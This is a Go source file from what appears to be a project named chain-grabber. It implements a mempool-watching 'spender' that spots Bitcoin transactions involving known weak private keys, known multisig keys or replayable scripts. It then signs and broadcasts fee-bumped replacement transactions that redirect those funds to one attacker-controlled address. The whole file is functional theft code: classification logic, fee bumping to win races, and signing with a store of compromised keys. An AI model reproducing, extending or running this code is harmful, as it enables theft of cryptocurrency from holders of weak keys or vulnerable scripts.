package memspender

import (
	"bytes"
	"context"
	"github.com/btcsuite/btcd/btcjson"
	"github.com/btcsuite/btcd/btcutil"
	"github.com/btcsuite/btcd/chaincfg"
	"github.com/btcsuite/btcd/chaincfg/chainhash"
	"github.com/btcsuite/btcd/txscript"
	"github.com/btcsuite/btcd/wire"
	"github.com/btcsuite/btcwallet/wallet/txauthor"
	"github.com/darwayne/chain-grabber/internal/core/blockchain/blockchainmodels"
	"github.com/darwayne/chain-grabber/pkg/broadcaster"
	"github.com/darwayne/chain-grabber/pkg/txhelper"
	"github.com/hashicorp/golang-lru/v2/expirable"
	"github.com/hashicorp/golang-lru/v2/simplelru"
	"github.com/pkg/errors"
	"go.uber.org/zap"
	"math"
	"sync"
	"sync/atomic"
	"time"
)

type secretStore interface {
	txauthor.SecretsSource
	HasAddress(address btcutil.Address) (bool, error)
	HasKey(key []byte) (bool, error)
	HasKnownCompressedKey(key []byte) (bool, error)
}

type Spender struct {
	txChan              <-chan *wire.MsgTx
	addressToSendTo     string
	addressScript       []byte
	address             btcutil.Address
	skipped             int64
	publisher           *broadcaster.Broker[*string]
	cfg                 *chaincfg.Params
	logger              *zap.Logger
	cli                 NetworkGrabber
	txCache             *expirable.LRU[chainhash.Hash, TxInfo]
	ignoredTransactions *simplelru.LRU[chainhash.Hash, struct{}]
	enableReplay        bool

	secretStore secretStore

	transMu          sync.RWMutex
	seenTransactions []*wire.MsgTx

	feeMu sync.RWMutex
	fee   blockchainmodels.Fee
}

type TxInfo struct {
	*wire.MsgTx
	IsWeak bool
	IsBad  bool
}

type NetworkGrabber interface {
	GetMemPoolEntry(ctx context.Context, hash chainhash.Hash) (*btcjson.GetMempoolEntryResult, error)
	GetAddressUTXOs(ctx context.Context, address string) ([]blockchainmodels.UTXO, error)
	GetFee(ctx context.Context) (*blockchainmodels.Fee, error)
	GetTransaction(ctx context.Context, hash chainhash.Hash) (*wire.MsgTx, error)
	GetUTXO(ctx context.Context, outpoint wire.OutPoint) (*blockchainmodels.UTXO, error)
}

func New(channel chan *wire.MsgTx, isTestNet bool, publisher *broadcaster.Broker[*string], address string, logger *zap.Logger,
	cli NetworkGrabber) (*Spender, error) {
	params := &chaincfg.MainNetParams
	if isTestNet {
		params = &chaincfg.TestNet3Params
	}
	decodedAddress, err := btcutil.DecodeAddress(address, params)
	if err != nil {
		return nil, errors.Wrap(err, "error decoding address")
	}
	addressScript, err := txscript.PayToAddrScript(decodedAddress)
	if err != nil {
		return nil, errors.Wrap(err, "error creating address script")
	}

	ignoreCache, err := simplelru.NewLRU[chainhash.Hash, struct{}](10_000, nil)
	if err != nil {
		return nil, errors.Wrap(err, "error setting up lru")
	}

	return &Spender{
		txChan:              channel,
		txCache:             expirable.NewLRU[chainhash.Hash, TxInfo](5000, nil, 5*time.Minute),
		ignoredTransactions: ignoreCache,
		addressToSendTo:     address,
		addressScript:       addressScript,
		address:             decodedAddress,
		publisher:           publisher,
		cfg:                 params,
		logger:              logger,
		cli:                 cli,
	}, nil
}

func (s *Spender) SetSecrets(store secretStore) {
	s.secretStore = store
}

func (s *Spender) SpendAddress(ctx context.Context, address string) error {
	utxos, err := s.cli.GetAddressUTXOs(ctx, address)
	if err != nil {
		return err
	}

	if len(utxos) == 0 {
		return nil
	}

	transactions := make(map[chainhash.Hash]*wire.MsgTx)
	for _, utxo := range utxos {
		if utxo.Value == 0 {
			continue
		}
		if _, found := transactions[utxo.Txid]; found {
			continue
		}
		tx, err := s.cli.GetTransaction(ctx, utxo.Txid)
		if err != nil {
			return err
		}
		transactions[tx.TxHash()] = tx
	}

	tx := wire.NewMsgTx(wire.TxVersion)

	var amounts []btcutil.Amount
	var prevPKScripts [][]byte

	var totalValue int64
	for _, utxo := range utxos {
		if utxo.Value == 0 {
			continue
		}
		utxo := utxo
		t := transactions[utxo.Txid]
		totalValue += utxo.Value
		amounts = append(amounts, btcutil.Amount(utxo.Value))
		o := t.TxOut[utxo.Index]
		prevPKScripts = append(prevPKScripts, o.PkScript)
		s.logger.Info("adding output", zap.String("txid", utxo.Txid.String()), zap.Uint32("idx", utxo.Index))
		tx.AddTxIn(wire.NewTxIn(wire.NewOutPoint(&utxo.Txid, utxo.Index), nil, nil))
	}

	if len(tx.TxIn) == 0 {
		s.logger.Info("nothing to spend detected")
		return nil
	}

	// bump the fee on the transaction by 2 sats per byte
	var bumpMultiplier int64 = 2

	s.feeMu.RLock()
	fee := s.fee
	s.feeMu.RUnlock()

	if fee.Fastest > float64(bumpMultiplier) {
		bumpMultiplier = int64(fee.Fastest * 2)
	}

	totalValue += -int64(txhelper.VBytes(tx) * float64(bumpMultiplier))
	// if after fees we're spending too much ... ignore
	if totalValue <= minSats {
		return nil
	}

	tx.AddTxOut(wire.NewTxOut(totalValue, s.addressScript))
	store := s.secretStore
	if err := txauthor.AddAllInputScripts(tx, prevPKScripts, amounts, store); err != nil {
		return err
	}

	return s.spendSignedTx(tx)
}

func (s *Spender) spendSignedTx(tx *wire.MsgTx) error {
	encodedTx := txhelper.ToStringPTR(tx)
	if encodedTx == nil {
		return errors.New("error encoding transaction")
	}
	s.publisher.Publish(encodedTx)
	return nil
}

func (s *Spender) Start(ctx context.Context) {
	t := time.NewTicker(10 * time.Minute)
	f, e := s.cli.GetFee(ctx)
	if e == nil {
		s.feeMu.Lock()
		s.fee = *f
		s.feeMu.Unlock()
	}

	go func() {
		ticker := time.NewTicker(500 * time.Microsecond)
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
			}

			s.transMu.RLock()
			size := len(s.seenTransactions)
			items := make([]*wire.MsgTx, 0, size)
			items = append(items, s.seenTransactions...)
			s.transMu.RUnlock()
			if size == 0 {
				continue
			}

			for _, tx := range items {
				s.onTx(ctx, tx)
			}

			s.transMu.Lock()
			s.seenTransactions = s.seenTransactions[size:]
			s.transMu.Unlock()
		}
	}()

	for {
		select {
		case <-ctx.Done():
			return
		case tx := <-s.txChan:
			s.transMu.Lock()
			s.seenTransactions = append(s.seenTransactions, tx)
			s.transMu.Unlock()
		case <-t.C:
			go func() {
				fee, err := s.cli.GetFee(ctx)
				if err == nil {
					s.feeMu.Lock()
					s.fee = *fee
					s.feeMu.Unlock()
				}
				seen := atomic.LoadInt64(&s.skipped)
				if seen == 0 {
					s.logger.Info("transactions seen", zap.Int64("total", seen))
				}

				atomic.StoreInt64(&s.skipped, 0)
			}()
		}
	}
}

const minSats = 800

func (s *Spender) onTx(ctx context.Context, tx *wire.MsgTx) {
	field := zap.String("txid", tx.TxHash().String())
	defer func() {
		if r := recover(); r != nil {
			s.logger.Error("ruh oh a panic occurred", field)
		}
	}()

	classification := s.classifyTx(tx)
	//s.logger.Info("saw", zap.String("id", tx.TxHash().String()), zap.String("c", classification.String()))
	switch classification {
	case ReplayableSimpleInput:
		s.replayTx(ctx, tx)
	case WeakKey:
		go func() {
			// wait a few seconds for message to propagate
			// as if we act too quickly nodes might not have the data
			time.Sleep(3 * time.Second)
			//s.logger.Info("mullah sent to weak address")
			s.spendWeakKey(ctx, tx)
		}()
	case SpentKnownKey:
		//s.logger.Info("replacing weak spend")
		s.spendKnownKey(ctx, tx)
	case SpentKnownMultiSig:
		//s.logger.Info("weak multisig spend detected", field)
		s.spendKnownMultiSig(ctx, tx)
	default:
		atomic.AddInt64(&s.skipped, 1)
	}

}

func (s *Spender) getTx(ctx context.Context, hash chainhash.Hash) *wire.MsgTx {
	if s.txCache.Contains(hash) {
		result, _ := s.txCache.Get(hash)
		return result.MsgTx
	}

	outTx, err := s.cli.GetTransaction(ctx, hash)
	if err != nil || outTx == nil {
		return nil
	}

	s.txCache.Add(hash, TxInfo{MsgTx: outTx})
	return outTx
}

func (s *Spender) spendKnownKey(ctx context.Context, tx *wire.MsgTx) {
	if s.ignoredTransactions.Contains(tx.TxHash()) {
		return
	}
	var amounts []btcutil.Amount
	var prevPKScripts [][]byte
	var totalValue int64
	var originalInputValue int64
	var originalOutputValue int64
	newTx := wire.NewMsgTx(wire.TxVersion)
	for _, in := range tx.TxIn {
		/* TODO:
		Check if this input is a known key
		if so get the original transaction it was originally associated to
		and consider caching the transaction for future reference

		if the input is a known input keep track of the PKScript and output value

		*/
		outTx := s.getTx(ctx, in.PreviousOutPoint.Hash)
		if outTx == nil || len(outTx.TxOut) < int(in.PreviousOutPoint.Index) {
			continue
		}

		//valid, _ := s.cli.GetUTXO(context.Background(), in.PreviousOutPoint)
		//if valid == nil {
		//	continue
		//}

		outpoint := outTx.TxOut[int(in.PreviousOutPoint.Index)]
		originalInputValue += outpoint.Value

		parsed := NewParsedScript(in.SignatureScript, in.Witness...)
		if !(parsed.IsP2PKH() || parsed.IsP2WPKH() || parsed.IsMultiSig()) {
			continue
		}
		key, _ := parsed.PublicKeyRaw()
		if key != nil {
			found, _ := s.secretStore.HasKnownCompressedKey(key)
			if !found {
				continue
			}
		}
		var keys [][]byte
		var minKeys int
		if key == nil {
			keys, minKeys, _ = parsed.MultiSigKeysRaw()
			var known int
			for _, k := range keys {
				found, _ := s.secretStore.HasKnownCompressedKey(k)
				if found {
					known++
				}
			}

			if known < minKeys {
				continue
			}
		}

		val := btcutil.Amount(outpoint.Value)
		amounts = append(amounts, val)
		totalValue += outpoint.Value
		prevPKScripts = append(prevPKScripts, outpoint.PkScript)

		in := wire.NewTxIn(&in.PreviousOutPoint, nil, nil)
		in.Sequence = 0xffffffff - 2
		newTx.AddTxIn(in)
	}

	if len(newTx.TxIn) == 0 {
		return
	}

	for _, out := range tx.TxOut {
		originalOutputValue += out.Value
	}

	originalSatsPerByte := math.Abs(math.Ceil(txhelper.SatsPerVByte(originalInputValue, tx)))

	multiplier := int64(originalSatsPerByte + 2)
	newTx.AddTxOut(wire.NewTxOut(totalValue, s.addressScript))
	size, err := s.calcSize(newTx, prevPKScripts, amounts)
	if err != nil {
		return
	}
	totalValue += -(multiplier * int64(math.Ceil(size)))
	if totalValue < minSats {
		s.ignoredTransactions.Add(tx.TxHash(), struct{}{})
		s.logger.Info("skipping weak spend .. final sats lower than threshold",
			zap.String("value", btcutil.Amount(totalValue).String()),
			zap.String("txid", tx.TxHash().String()))
		return
	}

	newTx.TxOut[0].Value = totalValue

	if err := txauthor.AddAllInputScripts(newTx, prevPKScripts, amounts, s.secretStore); err != nil {
		return
	}

	s.spendSignedTx(newTx)
	s.logger.Info("replacing weak spend",
		zap.String("weak_tx_id", tx.TxHash().String()),
		zap.String("tx_id", newTx.TxHash().String()))

}

func (s *Spender) spendKnownMultiSig(ctx context.Context, spentTx *wire.MsgTx) {
	var amounts []btcutil.Amount
	var prevPKScripts [][]byte
	var totalValue int64
	tx := wire.NewMsgTx(wire.TxVersion)

	var originalValue int64

	for _, out := range spentTx.TxOut {
		originalValue += out.Value
	}

	for _, in := range spentTx.TxIn {
		found, info := s.hasMultiSig(in)
		if found {
			inputTx := s.getTx(ctx, in.PreviousOutPoint.Hash)
			idx := int(in.PreviousOutPoint.Index)
			if inputTx == nil || len(inputTx.TxOut) < idx {
				return
			}

			out := inputTx.TxOut[idx]

			totalValue += out.Value
			prevPKScripts = append(prevPKScripts, out.PkScript)
			amounts = append(amounts, btcutil.Amount(out.Value))

			in := wire.NewTxIn(wire.NewOutPoint(&in.PreviousOutPoint.Hash, uint32(idx)), nil, nil)
			in.Sequence = 0xffffffff - 2
			in.SignatureScript = info.Data[len(info.Data)-1]
			tx.AddTxIn(in)
		}
	}

	if totalValue == 0 {
		return
	}

	if len(tx.TxIn) == len(spentTx.TxIn) && originalValue < totalValue {
		totalValue = originalValue // int64(float64(originalValue) * .999)
	} else {
		totalValue = int64(float64(totalValue) * .8)
	}

	const bumpFee = 5
	totalValue -= int64(txhelper.VBytes(tx) * bumpFee * 2)

	out := wire.NewTxOut(totalValue, s.addressScript)
	tx.AddTxOut(out)

	info := SignerOpts{IsMultiSig: true}

pkLoop:
	for _, pkScript := range prevPKScripts {
		_, addresses, _, _ := txscript.ExtractPkScriptAddrs(pkScript, s.cfg)

		for _, address := range addresses {
			switch address.(type) {
			case *btcutil.AddressWitnessPubKeyHash, *btcutil.AddressWitnessScriptHash, *btcutil.AddressTaproot:
				info.UseWitness = true
				break pkLoop
			}
		}

	}

	if err := SignTx(tx, prevPKScripts, amounts, s.secretStore, info); err != nil {
		return
	}

	if err := s.spendSignedTx(tx); err == nil {
		s.logger.Info("spending known multisig",
			zap.String("original_tx_id", spentTx.TxHash().String()),
			zap.String("tx_id", tx.TxHash().String()),
		)
	}

}

func (s *Spender) calcSize(tx *wire.MsgTx, prevPKScripts [][]byte, amounts []btcutil.Amount) (float64, error) {
	newTx := wire.NewMsgTx(tx.Version)
	for _, in := range tx.TxIn {
		newTx.AddTxIn(wire.NewTxIn(&in.PreviousOutPoint, in.SignatureScript, in.Witness))
	}
	for _, out := range tx.TxOut {
		newTx.AddTxOut(wire.NewTxOut(out.Value, out.PkScript))
	}

	if err := txauthor.AddAllInputScripts(newTx, prevPKScripts, amounts, s.secretStore); err != nil {
		return 0, err
	}

	return txhelper.VBytes(newTx), nil
}

func (s *Spender) replayTx(ctx context.Context, tx *wire.MsgTx) {
	totalValue := tx.TxOut[0].Value
	// bump the fee on the transaction by 2 sats per byte
	const bumpMultiplier = 2
	totalValue += -int64(txhelper.VBytes(tx) * bumpMultiplier)
	// if after fees we're spending too much ... ignore
	if totalValue <= minSats {
		return
	}

	// if we're here we can spend
	s.spendInput(ctx, tx.TxIn[0], totalValue, tx)
}

func (s *Spender) spendInput(ctx context.Context, input *wire.TxIn, val int64, originalTx *wire.MsgTx) {
	tx := wire.NewMsgTx(wire.TxVersion)
	tx.AddTxIn(input)

	tx.AddTxOut(wire.NewTxOut(val, s.addressScript))

	if err := s.spendSignedTx(tx); err == nil {
		s.logger.Info("sending transaction",
			zap.String("original_tx_id", originalTx.TxHash().String()),
			zap.String("tx_id", tx.TxHash().String()))
	}
}

func (s *Spender) hasMultiSig(in *wire.TxIn) (bool, ParsedScript) {
	return hasMultiSigKeys(in, s.secretStore)
}

func (s *Spender) spendWeakKey(ctx context.Context, weakTx *wire.MsgTx) {
	if s.ignoredTransactions.Contains(weakTx.TxHash()) {
		return
	}
	hash := weakTx.TxHash()
	s.logger.Info("weak key detected .. attempting to spend", zap.String("txid", hash.String()))
	if !s.txCache.Contains(hash) {
		s.txCache.Add(hash, TxInfo{
			MsgTx:  weakTx,
			IsWeak: true,
		})
	}

	var totalValue int64
	var prevPKScripts [][]byte
	var amounts []btcutil.Amount
	var outpoints []uint32

	origHash := weakTx.TxHash()
	memPoolEntry, _ := s.cli.GetMemPoolEntry(ctx, origHash)
	var inMempool = memPoolEntry != nil

outLoop:
	for idx, out := range weakTx.TxOut {
		_, addresses, _, err := txscript.ExtractPkScriptAddrs(out.PkScript, s.cfg)
		if err != nil {
			continue
		}

		point := wire.NewOutPoint(&origHash, uint32(idx))
		valid, _ := s.cli.GetUTXO(context.Background(), *point)
		if valid == nil {
			if !inMempool {
				continue
			}
		}

		for _, addr := range addresses {
			if found, _ := s.secretStore.HasAddress(addr); found {
				prevPKScripts = append(prevPKScripts, out.PkScript)
				amounts = append(amounts, btcutil.Amount(out.Value))
				totalValue += out.Value
				outpoints = append(outpoints, uint32(idx))
				continue outLoop
			}
		}
	}

	if len(outpoints) == 0 {
		return
	}

	tx := wire.NewMsgTx(wire.TxVersion)
	for _, idx := range outpoints {
		in := wire.NewTxIn(wire.NewOutPoint(&hash, idx), nil, nil)
		in.Sequence = 0xffffffff - 2
		tx.AddTxIn(in)
	}

	// bump the fee on the transaction by 2 sats per byte
	var bumpMultiplier int64 = 2

	// TODO: make these dynamic addresses
	output := wire.NewTxOut(totalValue, s.addressScript)
	tx.AddTxOut(output)

	s.feeMu.RLock()
	fee := s.fee
	s.feeMu.RUnlock()

	if fee.Fastest > float64(bumpMultiplier) {
		bumpMultiplier = int64(fee.Fastest)
	}
	txSize, err := s.calcSize(tx, prevPKScripts, amounts)
	if err != nil {
		s.logger.Info("error calculating size", zap.Error(err))
		return
	}

	totalValue += -int64(txSize * float64(bumpMultiplier))
	// if after fees we're spending too much ... ignore
	if totalValue <= minSats {
		s.ignoredTransactions.Add(weakTx.TxHash(), struct{}{})
		s.logger.Info("skipping weak key .. final sats lower than threshold",
			zap.String("value", btcutil.Amount(totalValue).String()))
		return
	}
	output.Value = totalValue

	store := s.secretStore
	if err := txauthor.AddAllInputScripts(tx, prevPKScripts, amounts, store); err != nil {
		s.logger.Info("error signing transaction", zap.String("err", err.Error()))
		return
	}

	if err := s.spendSignedTx(tx); err == nil {
		s.logger.Info("replacing weak transaction",
			zap.String("weak_tx_id", weakTx.TxHash().String()),
			zap.String("tx_id", tx.TxHash().String()))
	}
}

// classifyTx will attempt to classify a transaction determining if it is spendable or not
//
// Example Classifications:
//
// ReplayableSimpleInput
//
//	This classification means that the transaction contains a replayable input
//
// WeakKey
//
//	This classification means that funds were sent to an address with a known weak key
//
// EnemyWeakKey
//
//	This classification means we're facing off against an enemy spending a weak input we've already spent
func (s *Spender) classifyTx(tx *wire.MsgTx) TxClassification {
	//if tx.TxHash().String() == "3a07f80c6c1b1032286f2668a202d3f526881f87ae3e0278c6395b77ed09078b" {
	//	_ = fmt.Println
	//}
	if s.ignoredTransactions.Contains(tx.TxHash()) {
		return UnSpendable
	}
	var addresses []btcutil.Address
	for _, out := range tx.TxOut {
		_, add, _, _ := txscript.ExtractPkScriptAddrs(out.PkScript, s.cfg)
		if len(add) > 0 {
			for _, address := range add {
				if address.EncodeAddress() == s.addressToSendTo {
					return UnSpendable
				}
			}
			addresses = append(addresses, add...)
		}
	}

	var err error
	if len(tx.TxIn) == 0 || len(tx.TxOut) == 0 {
		//s.logger.Info("hmm no inputs or outputs detected .. marking as unspendable",
		//	zap.String("t", tx.TxHash().String()),
		//	zap.Int("inputs", len(tx.TxIn)),
		//	zap.Int("outputs", len(tx.TxOut)),
		//	zap.Int("addresses", len(addresses)),
		//	zap.Error(err))
		return UnSpendable
	}

	for _, in := range tx.TxIn {
		parsed := NewParsedScript(in.SignatureScript, in.Witness...)
		key, _ := parsed.PublicKeyRaw()
		if key != nil {
			found, _ := s.secretStore.HasKey(key)
			if found {
				s.logger.Info("known key detected",
					zap.String("original_tx_id", tx.TxHash().String()),
					zap.String("tx_input", in.PreviousOutPoint.String()))
				return SpentKnownKey
			}
			continue
		}

		if found, _ := hasParsedMultiSigKeys(in, parsed, s.secretStore); found {
			s.logger.Info("known multisig key detected",
				zap.String("original_tx_id", tx.TxHash().String()),
				zap.String("tx_input", in.PreviousOutPoint.String()))
			return SpentKnownMultiSig
		}

	}

	for _, address := range addresses {
		if found, _ := s.secretStore.HasAddress(address); found {
			s.logger.Info("weak key detected", zap.String("address", address.EncodeAddress()))
			return WeakKey
		}
	}

	if s.enableReplay && len(tx.TxIn) == 1 && len(tx.TxOut) == 1 && (len(tx.TxIn[0].SignatureScript) > 0 || len(tx.TxIn[0].Witness) > 0) {
		valid := isReplayable(tx.TxIn[0].SignatureScript, tx.TxIn[0].Witness...) && err == nil &&
			len(addresses) == 1

		if valid {
			outpoint := tx.TxIn[0].PreviousOutPoint
			var orig *wire.MsgTx
			if s.txCache.Contains(outpoint.Hash) {
				info, _ := s.txCache.Get(outpoint.Hash)
				orig = info.MsgTx
			} else {
				orig, err = s.cli.GetTransaction(context.Background(), outpoint.Hash)
				if err != nil {
					s.logger.Info("error getting transaction info", zap.String("err", err.Error()))
					return UnSpendable
				}
				s.txCache.Add(outpoint.Hash, TxInfo{MsgTx: orig})
			}

			if len(orig.TxOut) <= int(outpoint.Index) {
				s.txCache.Add(outpoint.Hash, TxInfo{MsgTx: orig, IsBad: true})
				s.logger.Info("got bad outpoint .. skipping")
				return UnSpendable
			}

			scriptClass, _, _, err := txscript.ExtractPkScriptAddrs(orig.TxOut[int(outpoint.Index)].PkScript, s.cfg)
			if err != nil || !(scriptClass == txscript.WitnessV0ScriptHashTy || scriptClass == txscript.ScriptHashTy) {
				s.logger.Debug("skipping bad tx output", zap.String("txid", tx.TxHash().String()))
				s.txCache.Add(outpoint.Hash, TxInfo{MsgTx: orig, IsBad: true})
				valid = false
			}

		}
		if valid {
			s.logger.Info("replayable transaction detected",
				zap.String("txid", tx.TxHash().String()),
				zap.String("original_address", addresses[0].String()),
				zap.String("encoded_address", addresses[0].EncodeAddress()),
			)
			return ReplayableSimpleInput
		}
	}

	return UnSpendable
}

// isReplayable checks if a script is replayable
func isReplayable(script []byte, witnesses ...[]byte) bool {
	parsed := NewParsedScript(script, witnesses...)
	if parsed.IsP2WPKH() || parsed.IsP2PKH() {
		return false
	}

	var (
		ops          []byte
		redeemScript []byte
		tok          txscript.ScriptTokenizer
		lastOp       byte
	)
	if len(witnesses) > 0 && len(script) == 0 {
		if len(witnesses) > 1 {
			for _, w := range witnesses {
				if !isReplayable(nil, w) {
					return false
				}
			}
		}
		redeemScript = witnesses[len(witnesses)-1]
		goto redeemStep
	}
	tok = txscript.MakeScriptTokenizer(0, script)

	for tok.Next() {
		op := tok.Opcode()
		// verify that this is a push only script
		// if it isn't short circuit
		if op > txscript.OP_16 {
			return false
		}
		ops = append(ops, op)

		// the last push should be the script
		redeemScript = tok.Data()
	}
	// if we have any errors return nil
	if tok.Err() != nil {
		return false
	}

redeemStep:
	ops = nil
	tok = txscript.MakeScriptTokenizer(0, redeemScript)
	for tok.Next() {
		lastOp = tok.Opcode()
		switch lastOp {
		case txscript.OP_CHECKSIG, txscript.OP_CHECKMULTISIG, txscript.OP_CHECKMULTISIGVERIFY,
			txscript.OP_CHECKSIGVERIFY, txscript.OP_CHECKSIGADD:
			// if this script has any sig operations we can't use it
			return false
		case txscript.OP_NOP4, txscript.OP_NOP5, txscript.OP_NOP6, txscript.OP_NOP7,
			txscript.OP_NOP8, txscript.OP_NOP9, txscript.OP_NOP10:
			return false
		}
		if lastOp > txscript.OP_CHECKSIGADD {
			// if we're here odds are we are dealing with a P2PKH
			return false
		}

		ops = append(ops, lastOp)
	}
	if tok.Err() != nil || lastOp == txscript.OP_RETURN {
		return false
	}

	if len(ops) > 1 && ops[0] == txscript.OP_0 {
		return false
	}

	// taproot signature??
	if bytes.Equal(ops, []byte{58, 3, 158}) {
		return false
	}

	return len(redeemScript) > 0
}

func hasMultiSigKeys(in *wire.TxIn, store secretStore) (isMultiSig bool, script ParsedScript) {
	parsed := NewParsedScript(in.SignatureScript, in.Witness...)
	return hasParsedMultiSigKeys(in, parsed, store)
}

func hasParsedMultiSigKeys(in *wire.TxIn, parsed ParsedScript, store secretStore) (bool, ParsedScript) {
	keys, minKeys, _ := parsed.MultiSigKeysRaw()
	if len(keys) == 0 {
		return false, parsed
	}

	var known int
	for _, k := range keys {
		found, _ := store.HasKey(k)
		if found {
			known++
		}
	}

	// TODO: axe the witness check?
	return known >= minKeys && len(in.Witness) == 0, parsed
}

type TxClassification int

func (t TxClassification) String() string {
	var val string
	switch t {
	case UnSpendable:
		val = "UnSpendable"
	case ReplayableSimpleInput:
		val = "ReplayableSimpleInput"
	case WeakKey:
		val = "WeakKey"
	case SpentKnownKey:
		val = "SpentKnownKey"
	case SpentKnownMultiSig:
		val = "SpentKnownMultiSig"
	}

	return val
}

const (
	UnSpendable TxClassification = iota
	ReplayableSimpleInput
	WeakKey
	SpentKnownKey
	SpentKnownMultiSig
)
